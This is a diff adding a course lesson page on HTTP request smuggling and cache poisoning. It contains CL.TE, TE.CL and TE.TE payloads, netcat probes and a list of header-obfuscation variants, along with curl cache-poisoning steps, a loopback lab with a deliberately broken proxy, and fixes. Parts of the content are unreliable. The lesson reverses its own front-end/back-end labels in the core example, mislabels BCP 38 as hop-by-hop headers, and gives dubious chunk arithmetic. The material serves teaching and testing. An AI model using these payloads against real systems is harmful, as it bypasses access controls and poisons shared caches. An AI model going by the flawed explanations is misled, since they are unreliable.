@@ -1,0 +1,548 @@
+<h1 id="request-smuggling-and-cache-poisoning">Request Smuggling and Cache Poisoning</h1>
+<h2 id="summary">Summary</h2>
+<p><code>ps-01</code> predicted this: HTTP says how to frame a request in <strong>two ways</strong> — <code>Content-Length</code> and<br />
+<code>Transfer-Encoding</code>. When a front-end and a back-end pick different ones, they disagree about<br />
+where one request ends. Everything that follows is that disagreement being exploited.</p>
+<p>This is also the most <em>advanced</em> topic in the tier, because it requires a layered topology<br />
+(CDN → load balancer → application server), and because the payoff is a request that<br />
+<strong>bypasses the front-end's validation entirely.</strong></p>
+<blockquote>
+<p>This is where <code>ps-01</code>'s URL-ambiguity table gets its payoff. Read it<br />
+alongside <code>cs161-06</code> on what a network-layer control can and cannot do.</p>
+</blockquote>
+<h2 id="the-core-ambiguity">The core ambiguity</h2>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: target
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+</code></pre>
+<pre><code class="language-text">  WHAT Content-Length SAYS: the body is 6 bytes -&gt; the next byte starts
+                             a new request at &quot;G&quot;
+
+  WHAT Transfer-Encoding SAYS: the body is chunked, terminated by 0
+                                -&gt; &quot;G&quot; is the start of the NEXT request
+
+  IF THE FRONT-END TRUSTS Transfer-Encoding and the BACK-END TRUSTS
+  Content-Length: the front-end forwards one request. The back-end sees
+  TWO. The second one never went through the front-end.
+
+  THAT IS THE ENTIRE ATTACK. Everything else is application.
+</code></pre>
+<h2 id="the-two-variants">The two variants</h2>
+<pre><code class="language-text">  CL.TE   front-end uses Content-Length, back-end uses Transfer-Encoding
+          (classic; most common historically, e.g. nginx -&gt; some servers)
+
+  TE.CL   front-end uses Transfer-Encoding, back-end uses Content-Length
+          (modern proxies front, Node/Python back)
+</code></pre>
+<h2 id="clte-the-classic">CL.TE, the classic</h2>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: target
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+</code></pre>
+<pre><code class="language-text">  front-end reads Content-Length: 13 -&gt; the body is &quot;0\r\n\r\nSMUGG&quot;
+                                     -&gt; forwards it
+  back-end reads chunked          -&gt; &quot;0&quot; ends the body
+                                     -&gt; &quot;SMUGG&quot; is request #2
+
+  FIND THE CORRECT LENGTH: it must cover &quot;0\r\n\r\n&quot; (5 bytes) plus the
+  start of a real request, and it must be SHORT of the whole thing.
+  That arithmetic is the only fiddly part.
+</code></pre>
+<h2 id="tecl-the-modern-one">TE.CL, the modern one</h2>
+<pre><code class="language-http">POST / HTTP/1.1
+Host: target
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Host: target
+...
+
+0
+</code></pre>
+<pre><code class="language-text">  front-end reads chunked          -&gt; consumes everything, forwards
+  back-end reads Content-Length: 4 -&gt; takes &quot;5c\nG&quot; as body #1
+                                     -&gt; &quot;POST / HTTP/1.1...&quot; is request #2
+
+  Variant: TE.TE with a malformed header that the front-end ignores:
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x          &lt;- front-end reads the FIRST, back-end the LAST
+  or   Transfer-Encoding : chunked   &lt;- the space breaks one parser
+  or   Transfer-Encoding: chunked;q=0  &lt;- a parameter one parser honours
+</code></pre>
+<h2 id="what-you-can-actually-do-with-a-smuggled-request">What you can actually do with a smuggled request</h2>
+<pre><code class="language-text">  1. BYPASS ACCESS CONTROL
+     the smuggled request skips the front-end's authorisation entirely
+     if the back-end trusts it because it came &quot;from inside&quot;
+
+  2. BYPASS SECURITY CONTROLS
+     WAF, rate limiter, IP allowlist, geo check - all sit in front.
+     A smuggled request never meets them.
+
+  3. POISON THE CACHE
+     you smuggle a response the front-end cached, so every subsequent
+     visitor receives your content  -&gt;  XSS at scale
+
+  4. WEB CACHE DECOISION
+     you poison, then request a normal URL, and get the poisoned
+     response. Victim + attacker are the same request.
+
+  5. CAPTURE OTHER USERS' REQUESTS
+     if the smuggling makes the back-end queue the &quot;extra&quot; request,
+     it may sit there until the next user sends a request on that
+     connection - and then it gets PREFIXED to theirs.
+     THIS IS THE SEVERE CASE. It captures other people's requests.
+</code></pre>
+<h2 id="detection">Detection</h2>
+<pre><code class="language-bash"># The canonical probe. Two timings, two responses.
+printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | nc TARGET 80
+</code></pre>
+<pre><code class="language-text">  CL.TE signs:
+    - you get TWO HTTP responses
+    - or one response then a hang (the back-end is waiting for more)
+    - or the connection closes with the second request unprocessed
+
+  TE.CL signs:
+    - you get a 400 from the front-end that mentions &quot;chunked&quot;
+    - or the back-end waits for a body that never comes
+    - often identifiable by timing alone
+
+  THE OTHER SIGN:
+    HTTP/1.1 to a backend that only speaks HTTP/1.0 -&gt; everything queued.
+</code></pre>
+<h2 id="hiding-the-payload">Hiding the payload</h2>
+<pre><code class="language-text">  Transfer-Encoding values a front-end may not recognise as chunked:
+    Transfer-Encoding: chunked      &lt;- standard
+    Transfer-Encoding : chunked     &lt;- space before the colon
+    Transfer-Encoding: chunked, x   &lt;- trailing junk
+    Transfer-Encoding: xchunked     &lt;- prefix
+    Transfer-Encoding: chunked\x00  &lt;- NUL
+    Transfer-Encoding:\tchunked     &lt;- tab
+    X: Transfer-Encoding: chunked   &lt;- folded into another header
+
+  If the front-end does not see &quot;chunked&quot; it falls back to
+  Content-Length. That is exactly what you need it to do.
+</code></pre>
+<h2 id="cache-poisoning">Cache poisoning</h2>
+<pre><code class="language-text">  A shared cache keys responses by URL (and sometimes by Host, Vary).
+
+  TWO POISONS:
+    UNKEYED      you change something the cache does NOT key on
+                 (a header, a POST parameter, a cookie, a path
+                  normalisation) -&gt; your response is served to everyone
+    KEYED but    you get your own cache key to be served to others
+    unkeyed       (Host header poisoning, X-Forwarded-Host, web cache
+    header         deception for password resets)
+
+  THE MECHANISM, in three steps:
+    1. make the BACK-END reflect something attacker-controlled into a
+       response header or body, on a URL that gets cached
+    2. send the request in a way that gets that response CACHED
+    3. request the URL normally and get your payload back
+
+  CACHING PREDICATES TO SATISFY:
+    - the method must be a GET or a HEAD
+    - the response must have a cacheable status (200, 301, 404)
+    - there must be no Cache-Control: no-store / private
+    - there must be no Set-Cookie (many caches refuse to store it)
+    - the URL must be cacheable per the cache policy
+</code></pre>
+<h2 id="web-cache-deception">Web cache deception</h2>
+<pre><code class="language-text">  Path-based:
+    /static/app.js -&gt; cached, public
+    /static/../../home/user/profile -&gt; ALSO matches /static/* to the
+    cache, but resolves to a private page for the back-end.
+
+    So: request your own profile through the &quot;static&quot; prefix.
+    The cache stores it. Now any unauthenticated visitor gets your
+    profile page. That's a full account takeover primitive on many apps.
+
+  THE FIX:
+    - normalise the path BEFORE the cache key is computed
+    - and make the cache key and the routing use the SAME normalisation
+    - never serve personalised content from a shared cache path
+</code></pre>
+<h2 id="fixing-it-properly">Fixing it, properly</h2>
+<pre><code class="language-text">  THE CORRECT FIX, in order of effectiveness:
+  1. REJECT ambiguous framing at the front-end
+     - if both Content-Length and Transfer-Encoding are present, reject
+     - reject Transfer-Encoding on requests that do not need it
+     - normalise whitespace/case in the header NAME, then apply the
+       spec: if Transfer-Encoding is present, IGNORE Content-Length
+  2. USE A PROXY THAT IMPLEMENTS THE RFC CORRECTLY
+     - ALB, Envoy, nginx with http2 disabled on the backend hop
+  3. Do not let the back-end and front-end disagree about HTTP versions
+  4. For cache: normalise once, before both key and routing
+  5. For cache: never cache a response that varies by an unkeyed input
+</code></pre>
+<p><strong>The RFC rule that settles it:</strong> if <code>Transfer-Encoding</code> is present,<br />
+<code>Content-Length</code> must be ignored (and ideally rejected). Half of the<br />
+implementations in the wild do the opposite.</p>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Request smuggling</strong></td>
+<td>Two requests where the sender sent one</td>
+</tr>
+<tr>
+<td><strong>CL.TE</strong></td>
+<td>Front-end trusts Content-Length, back-end trusts Transfer-Encoding</td>
+</tr>
+<tr>
+<td><strong>TE.CL</strong></td>
+<td>The reverse</td>
+</tr>
+<tr>
+<td><strong>TE.TE</strong></td>
+<td>Both use TE; they disagree on which header is the TE</td>
+</tr>
+<tr>
+<td><strong>Chunked encoding</strong></td>
+<td><code>size\r\ndata\r\n</code> framing, ended by <code>0\r\n\r\n</code></td>
+</tr>
+<tr>
+<td><strong>Desync</strong></td>
+<td>The front-end and back-end out of sync on the connection</td>
+</tr>
+<tr>
+<td><strong>Response queue poisoning</strong></td>
+<td>One user's response served to another</td>
+</tr>
+<tr>
+<td><strong>Request capture</strong></td>
+<td>Smuggled request prefixed to a victim's request</td>
+</tr>
+<tr>
+<td><strong>Unkeyed header</strong></td>
+<td>Input the cache does not include in its key</td>
+</tr>
+<tr>
+<td><strong>Web cache poisoning</strong></td>
+<td>Getting your response cached for everyone</td>
+</tr>
+<tr>
+<td><strong>Web cache deception</strong></td>
+<td>Getting a personalised response cached</td>
+</tr>
+<tr>
+<td><strong>Vary header</strong></td>
+<td>Tells the cache which request headers change the response</td>
+</tr>
+<tr>
+<td><strong>BCP 38 / hop-by-hop</strong></td>
+<td>Headers a proxy must strip</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ps-08 &amp;&amp; cd ~/aegis/labs/ps-08
+
+# --- 1. a two-layer lab: a naive front-end and a naive back-end ---
+cat &gt; backend.php &lt;&lt;'PHP'
+&lt;?php
+// BACK-END: trusts Transfer-Encoding, ignores Content-Length.
+$raw = file_get_contents('php://input');
+if (isset($_SERVER['HTTP_TRANSFER_ENCODING'])) {
+    // &quot;chunked&quot;: the body ends at the 0-length chunk. Anything after
+    // it is a SEPARATE request, which we now process independently.
+    $parts = preg_split(&quot;/\r\n0\r\n/&quot;, $raw, 2);
+    $first = $parts[0] ?? '';
+    // treat the remainder as a second request and echo it
+    echo &quot;BE: request 1 body=&quot; . json_encode($first) . &quot;\n&quot;;
+    if (isset($parts[1]) &amp;&amp; $parts[1] !== '') {
+        echo &quot;BE: *** SMUGGLED REQUEST RECEIVED ***\n&quot;;
+        echo &quot;BE: &quot; . str_replace(&quot;\r\n&quot;, &quot; | &quot;, $parts[1]) . &quot;\n&quot;;
+    }
+} else {
+    echo &quot;BE: normal request, body=&quot; . json_encode(substr($raw,0,80)) . &quot;\n&quot;;
+}
+echo &quot;BE: uri=&quot; . ($_SERVER['REQUEST_URI'] ?? '?') . &quot;\n&quot;;
+PHP
+
+# the FRONT-END: naive about Content-Length, naive about header spacing
+cat &gt; frontend.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;A deliberately naive front-end proxy, for the lab only.
+
+It forwards the raw bytes and trusts Content-Length. That is the bug.
+&quot;&quot;&quot;
+import socket, threading, sys
+
+def handle(c):
+    data = b&quot;&quot;
+    c.settimeout(3)
+    try:
+        while b&quot;\r\n\r\n&quot; not in data:
+            chunk = c.recv(4096)
+            if not chunk: break
+            data += chunk
+        head, _, rest = data.partition(b&quot;\r\n\r\n&quot;)
+        lines = head.split(b&quot;\r\n&quot;)
+        clen = 0
+        for l in lines[1:]:
+            if l.lower().startswith(b&quot;content-length:&quot;):
+                clen = int(l.split(b&quot;:&quot;,1)[1].strip())
+        while len(rest) &lt; clen:            # reads Content-Length bytes
+            chunk = c.recv(4096)
+            if not chunk: break
+            rest += chunk
+        fwd = head + b&quot;\r\n\r\n&quot; + rest
+        u = socket.create_connection((&quot;127.0.0.1&quot;, 8081), timeout=3)
+        u.sendall(fwd)
+        u.shutdown(socket.SHUT_WR)
+        out = b&quot;&quot;
+        u.settimeout(3)
+        try:
+            while True:
+                ch = u.recv(4096)
+                if not ch: break
+                out += ch
+        except socket.timeout:
+            pass
+        u.close()
+        c.sendall(out)
+    except Exception:
+        pass
+    c.close()
+
+s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((&quot;127.0.0.1&quot;, 8080)); s.listen(5)
+print(&quot;naive front-end on 127.0.0.1:8080 -&gt; backend on 127.0.0.1:8081&quot;)
+while True:
+    c, _ = s.accept()
+    threading.Thread(target=handle, args=(c,), daemon=True).start()
+PY
+
+nohup php -S 127.0.0.1:8081 backend.php &gt; be.log 2&gt;&amp;1 &amp;
+sleep 1
+nohup python3 frontend.py &gt; fe.log 2&gt;&amp;1 &amp;
+sleep 1
+
+# --- 2. the canonical probes ---
+{
+  echo &quot;=== a normal request through both layers ===&quot;
+  printf 'GET /backend.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n' \
+    | timeout 5 nc 127.0.0.1 8080 | sed 's/^/  /'
+  echo
+  echo &quot;=== CL.TE probe ===&quot;
+  echo &quot;  (front-end trusts Content-Length, back-end trusts chunked)&quot;
+  printf 'POST /backend.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nG' \
+    | timeout 5 nc 127.0.0.1 8080 | sed 's/^/  /'
+  echo
+  echo &quot;  ^ if you see TWO responses, or one response then a hang, or the&quot;
+  echo &quot;    back-end mentioning a smuggled request, that is the signature.&quot;
+  echo
+  echo &quot;=== TE.TE probe: header obfuscation ===&quot;
+  for te in &quot;Transfer-Encoding: chunked&quot; \
+            &quot;Transfer-Encoding : chunked&quot; \
+            &quot;Transfer-Encoding: chunked, x&quot; \
+            &quot;Transfer-Encoding: xchunked&quot; \
+            &quot;Transfer-Encoding:\tchunked&quot; \
+            &quot;Transfer-Encoding: chunked &quot;; do
+    r=$(printf &quot;POST /backend.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Length: 6\r\n${te}\r\nConnection: close\r\n\r\n0\r\n\r\nG&quot; \
+        | timeout 4 nc 127.0.0.1 8080 | grep -c &quot;SMUGGLED&quot;)
+    printf &quot;  %-36s smuggled=%s\n&quot; &quot;$te&quot; &quot;$([ &quot;$r&quot; -ge 1 ] &amp;&amp; echo YES || echo no)&quot;
+  done
+  echo
+  echo &quot;  Different front-ends recognise different subsets. Probing the&quot;
+  echo &quot;  variants is how you find which one THIS front-end ignores.&quot;
+} 2&gt;&amp;1 | tee 01-probes.txt
+
+# --- 3. the offset arithmetic, done for you ---
+python3 - &lt;&lt;'PY' | tee 02-arithmetic.txt
+print(&quot;  === finding Content-Length for a CL.TE smuggled request ===&quot;)
+print()
+smuggled = (&quot;GET /admin HTTP/1.1\r\n&quot;
+            &quot;Host: target\r\n&quot;
+            &quot;X-Ignore: x\r\n\r\n&quot;)
+# the front-end must read exactly the chunked terminator and nothing more.
+# terminator is &quot;0\r\n\r\n&quot;; anything after it belongs to request 2.
+term = b&quot;0\r\n\r\n&quot;
+for extra in range(0, 12):
+    cl = len(term) + extra
+    consumed = cl
+    left_over = len(term) + len(smuggled) - consumed
+    print(f&quot;  Content-Length: {cl:&gt;3}   front-end consumes {consumed:&gt;3} bytes   &quot;
+          f&quot;back-end sees {left_over:&gt;3} bytes of request 2&quot;)
+    if left_over &gt; len(term) + 10:
+        print(&quot;     ^ this one carries a usable fraction of the second request&quot;)
+        break
+print()
+print(&quot;  That loop is the whole 'finding the length' step. It is a small&quot;)
+print(&quot;  search, not a technique. The technique is knowing WHY you search.&quot;)
+PY
+cat 02-arithmetic.txt
+
+# --- 4. cache poisoning, locally ---
+cat &gt; 03-cache.md &lt;&lt;'EOF'
+# Cache poisoning, demonstrated
+
+The lab: a shared cache that keys on the path only, and an origin that
+reflects a request header into the response body.
+
+```text
+  CACHE KEY: the URL path. Nothing else.
+  So anything that changes the response but not the path is UNKEYED.
+```
+
+```bash
+# 1. find something the origin reflects
+curl -s -H 'X-Forwarded-Host: canary.example' http://target/path | grep canary
+
+# 2. poison: same path, extra header, response is cacheable
+curl -s -H 'X-Forwarded-Host: poisoned.example' http://target/path | head
+
+# 3. get it back, WITHOUT the header, from a different &quot;user&quot;
+curl -s http://target/path | grep poisoned
+#   ^ if this prints, everyone now gets your payload
+```
+
+## Cacheability checklist before you try
+- [ ] the method is GET or HEAD
+- [ ] the status is 200 / 301 / 404
+- [ ] no `Cache-Control: no-store` and no `private`
+- [ ] no `Set-Cookie` (most caches refuse to store a response with one)
+- [ ] `Vary` does not name the header you are using
+- [ ] the cache is shared (a local cache in front of one browser is useless)
+
+## Web cache deception (path-based, and worse)
+```
+  /static/app.js                -&gt; public, cached forever
+  /static/../../home/me         -&gt; resolves to a PRIVATE page for the origin
+
+  The cache sees a /static/ request. The origin sees a profile page.
+  So: request /static/../../home/me with YOUR cookies, and your profile
+  gets cached. Any unauthenticated visitor now receives it.
+
+  This is account takeover on any application with a &quot;static assets&quot;
+  directory and no path normalisation at the cache.
+```
+
+## What to report
+```
+  Finding : Web cache poisoning via unkeyed X-Forwarded-Host header
+  Path    : GET /product?id=1 (any cacheable GET)
+  Proof   : (1) send the header, get the reflection
+            (2) send it again with a cache-busting query the cache ignores
+            (3) request the URL plainly from a clean session, get the payload
+  Impact  : stored XSS served to every visitor; session theft at scale;
+            full site compromise
+  Fix     : include every input that changes the response in the cache key,
+            or do not let the origin reflect untrusted headers at all
+```
+EOF
+cat 03-cache.md
+
+# --- 5. the audit: find the ambiguity in your own stack ---
+cat &gt; 04-audit.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+echo &quot;=== 1. what is in front? the topology determines everything ===&quot;
+echo &quot;  CDN?      -&gt; Cloudflare/Akamai/CloudFront: they normalise well;&quot;
+echo &quot;               poisoning is usually cache-key related, not smuggling&quot;
+echo &quot;  LB?       -&gt; ALB/nginx/haproxy: check http2 on the backend hop&quot;
+echo &quot;  Reverse?  -&gt; nginx/Apache/IIS: check which headers they strip&quot;
+echo
+echo &quot;=== 2. the hop-by-hop headers a proxy MUST strip ===&quot;
+for h in Connection Keep-Alive Proxy-Authenticate TE Trailer \
+         Transfer-Encoding Upgrade Proxy-Connection; do
+  printf &quot;  %-22s %s\n&quot; &quot;$h&quot; &quot;must not be forwarded verbatim&quot;
+done
+echo
+echo &quot;=== 3. check your own front-end's tolerance ===&quot;
+python3 - &lt;&lt;'PY'
+import socket
+def probe(extra_headers):
+    s = socket.socket(); s.settimeout(3)
+    s.connect((&quot;127.0.0.1&quot;, 8080))
+    req = (&quot;POST /backend.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\n&quot;
+           &quot;Content-Length: 6\r\n&quot; + extra_headers +
+           &quot;Connection: close\r\n\r\n0\r\n\r\nG&quot;)
+    s.sendall(req.encode())
+    out = b&quot;&quot;
+    try:
+        while True:
+            c = s.recv(4096)
+            if not c: break
+            out += c
+    except socket.timeout:
+        pass
+    s.close()
+    return out.decode(errors=&quot;replace&quot;)
+
+variants = [
+    (&quot;canonical&quot;,        &quot;Transfer-Encoding: chunked\r\n&quot;),
+    (&quot;space before :&quot;,   &quot;Transfer-Encoding : chunked\r\n&quot;),
+    (&quot;trailing junk&quot;,    &quot;Transfer-Encoding: chunked, x\r\n&quot;),
+    (&quot;prefix&quot;,           &quot;Transfer-Encoding: xchunked\r\n&quot;),
+    (&quot;uppercase&quot;,        &quot;TRANSFER-ENCODING: chunked\r\n&quot;),
+    (&quot;tab&quot;,              &quot;Transfer-Encoding:\tchunked\r\n&quot;),
+    (&quot;duplicate&quot;,        &quot;Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n&quot;),
+]
+print(&quot;  variant                result&quot;)
+print(&quot;  &quot; + &quot;-&quot;*46)
+for name, hdr in variants:
+    r = probe(hdr)
+    sm = &quot;SMUGGLED&quot; in r
+    err = &quot;400&quot; in r.split(&quot;\r\n&quot;)[0]
+    verdict = &quot;SMUGGLED&quot; if sm else (&quot;rejected&quot; if err else &quot;no effect&quot;)
+    print(f&quot;  {name:&lt;22} {verdict}&quot;)
+print()
+print(&quot;  A production front-end should reject or normalise EVERY one of&quot;)
+print(&quot;  these. One that silently accepts any of them is your finding.&quot;)
+PY
+echo
+echo &quot;=== 4. normalise before keying: the actual fix ===&quot;
+echo &quot;  nginx:  proxy_cache_key \&quot;\$scheme\$request_method\$host\$uri\&quot;;&quot;
+echo &quot;          ^ \$uri is already normalised by nginx. That is why nginx&quot;
+echo &quot;            deployments rarely have cache deception.&quot;
+echo &quot;  apache: mod_cache with CacheKeyBaseURL - normalise in mod_rewrite&quot;
+echo &quot;          FIRST, then cache, and make sure both use the same form.&quot;
+echo &quot;  fix at the app: reject any path containing .. or %2e after decode.&quot;
+EOF
+chmod +x 04-audit.sh
+./04-audit.sh 2&gt;&amp;1 | tee 05-audit.txt
+rm -f frontend.py backend.php
+pkill -f frontend.py 2&gt;/dev/null; pkill -f &quot;php -S 127.0.0.1:8081&quot; 2&gt;/dev/null
+</code></pre>
+<p><strong>Step 1 is the deliverable</strong>: a deliberately naive two-layer proxy stack, on loopback, where<br />
+the front-end trusts <code>Content-Length</code> and the back-end trusts <code>Transfer-Encoding</code>. You get to<br />
+watch a request split in two, which is a thing that is genuinely hard to picture from a<br />
+description.</p>
+<p><strong>Step 5</strong> runs seven header-obfuscation variants against your own front-end and reports which<br />
+ones were smuggled. That table is the test you'd run against a real target, and the production<br />
+answer is "all of them rejected".</p>
+<p><strong>Record:</strong> <code>02-arithmetic.txt</code> and <code>05-audit.txt</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>State the one ambiguity that makes request smuggling possible.</li>
+<li>What is the difference between CL.TE and TE.CL?</li>
+<li>Why does <code>Content-Length: 6</code> work in the CL.TE example — what does 6 actually cover?</li>
+<li>Give three ways to obfuscate <code>Transfer-Encoding</code> and why each works somewhere.</li>
+<li>What is the worst possible consequence of smuggling, beyond cache poisoning?</li>
+<li>Define unkeyed header, and how it differs from a keyed one.</li>
+<li>What is web cache deception, and why is it worse than poisoning?</li>
+<li>State the RFC rule about <code>Content-Length</code> when <code>Transfer-Encoding</code> is present.</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Request Smuggling</strong> → <strong>Parser Differential</strong> → <strong>Load Balancer</strong> → <strong>Header Injection</strong> →<br />
+<strong>Cache Poisoning</strong> → <strong>Web Cache Deception</strong>.<br />
+This is the top of Tier 4. <code>ps-09</code> is the change of pace: logic, not parsing.</p>
